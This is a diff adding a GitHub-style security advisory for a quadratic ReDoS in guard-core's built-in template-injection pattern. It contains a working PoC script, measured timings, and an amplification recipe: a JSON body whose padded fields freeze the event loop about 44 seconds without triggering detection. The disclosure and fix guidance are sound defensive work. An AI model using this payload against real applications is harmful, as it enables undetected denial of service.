@@ -1,0 +1,74 @@
+{
+  "id": "GHSA-r7hm-rjvg-xx7j",
+  "modified": "2026-11-19T23:00:36.653178059Z",
+  "published": "2026-11-19T22:49:33Z",
+  "aliases": [
+    "CVE-2026-129302"
+  ],
+  "summary": "Guard Core: Quadratic ReDoS in built-in detection pattern freezes the event loop with a single request",
+  "details": "### Summary\n\nA polynomial (quadratic) regular-expression denial of service in guard-core's built-in penetration-detection patterns allows any unauthenticated remote client to freeze **every** endpoint of an application for seconds per request, using only the default configuration. The triggering request completes without any detection match — no ban counter increments, no rate-limit violation is recorded — so it can be repeated indefinitely. Since guard-core 3.5.0, only *custom* patterns are executed through the compiler's timeout-protected `create_safe_matcher()`; all built-in patterns run as a bare, inline `pattern.search(content)` directly on the asyncio event loop. guard-core ≤ 3.4.0 ran built-ins through the safe matcher (verified in the 3.4.0 wheel, `_check_regex_pattern`), so this is a **regression introduced in 3.5.0** — and it silently undoes the protection credited to GHSA-rrf6-pxg8-684g (CVE-2025-54365) and the unbounded-quantifier remediation of GHSA-j47q-rc62-w448 (CVE-2025-53539) for every stock pattern, despite the changelog advertising \"Safe regex execution with configurable timeouts to prevent ReDoS attacks.\"\n\n### Details\n\n**1. The pattern** — `guard_core/handlers/suspatterns_handler.py:519` (master `08780f1`), the built-in template-injection detector:\n\n```python\nr\"\\{\\{\\s*[^\\}]+(?:system|exec|popen|eval|require|include)\\s*\\}\\}\"\n```\n\nOn an input of `{` repeated N times, every one of the N−1 positions starts a `\\{\\{` match attempt and `[^\\}]+` scans to end-of-string and backtracks once per position → O(N²). Note the sibling pattern at `:524` (`\\{\\%\\s*[^\\%]+...`) is **not** vulnerable — its delimiter `%` is excluded from the character class, keeping scans bounded — which confirms the root cause is the unbounded, non-excluding `[^\\}]+`.\n\n**2. The unprotected execution path** — `guard_core/handlers/suspatterns_handler.py:910-926`:\n\n```python\nif compiler:\n    if category == \"custom\":\n        safe_matcher = compiler.create_safe_matcher(pattern)   # executor + timeout\n        match = safe_matcher(content)\n        ...\n    else:\n        match = pattern.search(content)                        # ← inline, NO timeout\n```\n\nIn enhanced mode (the default whenever a `SecurityConfig` is present — `_supports_enhanced_config()` is a duck-type attribute check a stock config always passes), all built-in patterns execute inline **inside the async coroutine**, blocking the event loop for the full scan. In guard-core ≤ 3.4.0, `_check_regex_pattern()` routed *every* pattern through `self._compiler.create_safe_matcher(pattern.pattern)` (verified in the 3.4.0 wheel, `suspatterns_handler.py:565-567`) or, without a compiler, through `_check_pattern_with_timeout` (4-worker pool + per-pattern timeout). The `category == \"custom\"` exemption appeared in 3.5.0.\n\n**3. Default reachability** — penetration detection is on by default (`enable_penetration_detection=True`), query parameters are scanned by default (`guard_core/utils.py:843-865`), and the default scan window `detection_max_content_length=10000` (`models.py:765-770`) admits the full 10,000-character payload. A run of `{` survives preprocessing untouched.\n\n**Measured** (CPython 3.14, guard-core 3.12.0):\n\n| input | detect() wall time | event-loop lag (measured in-process) |\n|---|---|---|\n| `{` × 2,500 | 0.15 s | — |\n| `{` × 5,000 | 0.46 s | — |\n| `{` × 10,000 | **1.85 s** | **2.57 s cumulative** across the three calls |\n\nClean 4× per doubling — quadratic, not exponential. Profiling all built-ins against the payload attributes 1.766 s of the 1.77 s total to this single pattern (one-line fix: bound the gap, e.g. `\\{\\{\\s*[^\\}\\s]{0,64}(?:system|exec|popen|eval|require|include)\\s*\\}\\}`).\n\n**Amplification:** every scanned value pays the cost independently (`utils.py:843-890` per query param/header; `utils.py:936-977` per JSON string field). A single 256 KB JSON body (the default `detection_max_body_inspect_bytes`) containing ~25 string fields of `{`×10,000 measured **44.03 s of continuous event-loop blockage from one request**, returning normally with no detection hit.\n\n**Why rate limiting doesn't help:** guard-core defaults are `rate_limit=10` per `rate_limit_window=60` s (`models.py:369-375`), and the `rate_limit` check runs before `suspicious_activity` in the default pipeline. 10 × 44 s = **440 s of loop blockage per 60 s window from a single IP** — single-source saturation, no distribution needed.\n\n**Framework reach:** any adapter embedding guard-core on an asyncio loop — fastapi-guard, flaskapi-guard (async deployments), djapi-guard (ASGI) — shares the loop with the application, so the freeze takes down every endpoint of the host application, not just the guarded routes.\n\n### PoC\n\n**guard-core only — no framework adapter needed.** Requires `pip install guard-core`, then `python poc_guard_core_redos.py`. Exit code 0 = freeze reproduced.\n\n```python\n\"\"\"PoC: event-loop ReDoS in guard-core (\u003e= 3.5.0, \u003c= 3.12.0), default config.\n\nThe built-in template-injection pattern is quadratic on '{' x N, and since 3.5.0\nbuilt-in patterns execute inline (pattern.search) with NO timeout — only\n`custom` patterns get the compiler's safe matcher. One detect() call with a\n10,000-char value blocks the event loop ~1.8s; a 256KB JSON body with ~25 such\nfields blocks it ~44s. Runs on the asyncio loop that any adapter\n(fastapi-guard, flaskapi-guard, djapi-guard) shares with the app.\n\nRun:  python poc_guard_core_redos.py\nExit code 0 = freeze reproduced (max loop lag \u003e 1s).\n\"\"\"\n\nimport asyncio\nimport time\n\nfrom guard_core.handlers.suspatterns_handler import sus_patterns_handler\nfrom guard_core.models import SecurityConfig\n\nLOOP_LAGS: list[float] = []\n\n\nasync def _loop_lag_monitor() -\u003e None:\n    while True:\n        t0 = time.monotonic()\n        await asyncio.sleep(0.05)\n        LOOP_LAGS.append(time.monotonic() - t0 - 0.05)\n\n\nasync def main() -\u003e int:\n    config = SecurityConfig(enable_redis=False)  # defaults = enhanced mode\n    sus_patterns_handler.configure(config)\n\n    monitor = asyncio.create_task(_loop_lag_monitor())\n    await asyncio.sleep(0.3)  # baseline samples\n\n    for n in (2_500, 5_000, 10_000):\n        t0 = time.perf_counter()\n        result = await sus_patterns_handler.detect(\n            content=\"{\" * n, ip_address=\"203.0.113.7\", context=\"query_param:q\"\n        )\n        print(f\"'{{' x {n:5d}: {time.perf_counter()-t0:.2f}s  is_threat={result['is_threat']}\")\n\n    # let the starved monitor task wake and record the lag it just endured\n    await asyncio.sleep(0.1)\n    max_lag = max(LOOP_LAGS)\n    print(f\"\\nmax event-loop lag during run: {max_lag:.2f}s\")\n    print(\"VERDICT:\", \"FROZEN\" if max_lag \u003e 1.0 else \"not reproduced\")\n\n    monitor.cancel()\n    return 0 if max_lag \u003e 1.0 else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(asyncio.run(main()))\n```\n\n**Observed output** (Python 3.14, guard-core 3.12.0):\n\n```\n'{' x  2500: 0.16s  is_threat=False\n'{' x  5000: 0.51s  is_threat=False\n'{' x 10000: 1.91s  is_threat=False\n\nmax event-loop lag during run: 2.57s\nVERDICT: FROZEN\n```\n\nAn end-to-end proof through the fastapi-guard adapter (default config, real uvicorn server, in-process loop-lag monitor) measured **1.75 s of server-side event-loop lag from one GET request returning HTTP 200** — available on request.\n\n### Impact\n\n**Kind of vulnerability:** Regular Expression Denial of Service — CWE-1333 / CWE-400. Polynomial (quadratic) runtime, O(N²), not exponential backtracking.\n\n**Who is impacted:** every application embedding guard-core ≥ 3.5.0 with its default configuration (penetration detection enabled) in a single-process asyncio deployment. One unauthenticated request freezes all endpoints for ~1.8 s; one padded POST body freezes them for tens of seconds; repeated requests at only 10/min saturate the worker indefinitely. Because the payload triggers no detection match, no ban counter increments and nothing is logged as suspicious — the attack is invisible in guard-core's own telemetry.\n\n**Fix directions:** (1) bound the quantifier in the template pattern (its `{%` sibling at `:524` is already safe because `[^\\%]+` excludes the delimiter — excluding the delimiter, or bounding the gap, closes it); (2) route built-in patterns through the same `create_safe_matcher()` timeout path as custom patterns, restoring the ≤ 3.4.0 behavior that the changelog advertises.\n\n\n\n## Reporter validation request\n\nThe fix ships in guard-core 3.13.0, now on PyPI. If you reported this issue, please install 3.13.0 and confirm it is resolved. You can reply in this advisory's discussion thread or open a new issue with the result.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "guard-core",
+        "purl": "pkg:pypi/guard-core"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.5.0"
+            },
+            {
+              "fixed": "3.13.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "3.10.0",
+        "3.11.0",
+        "3.12.0",
+        "3.5.0",
+        "3.6.0",
+        "3.7.0",
+        "3.7.1",
+        "3.8.0",
+        "3.8.1",
+        "3.9.0"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.12.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-r7hm-rjvg-xx7j/GHSA-r7hm-rjvg-xx7j.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Guard-Core/guard-core/security/advisories/GHSA-r7hm-rjvg-xx7j"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-129302"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Guard-Core/guard-core/pull/68"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Guard-Core/guard-core/commit/c07239fa1c5aa93e3f179440e79dad652977d3e4"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Guard-Core/guard-core/releases/tag/3.13.0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/rennf93/guard-core"
+    }
+  ]
+}
